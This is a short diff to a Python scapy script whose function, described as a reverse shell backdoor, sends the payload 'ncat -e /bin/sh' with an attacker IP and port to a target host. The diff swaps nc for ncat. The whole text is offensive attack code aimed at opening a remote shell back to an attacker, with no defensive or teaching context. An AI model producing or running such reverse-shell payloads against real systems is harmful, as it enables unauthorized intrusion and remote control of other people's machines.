@@ -1,7 +1,7 @@
 from scapy.all import * 
 #reverse shell function targeting an IP and port 
 def reverse_shell(target_ip, target_port, attacker_ip, attacker_port):
- payload = f"nc -e /bin/sh {attacker_ip} {attacker_port}" 
+ payload = f"ncat -e /bin/sh {attacker_ip} {attacker_port}" 
  exploit = IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=payload.encode()) 
  print(f"Creating reverse shell backdoor on {target_ip}:{target_port}") 
  send(exploit, verbose=0) 
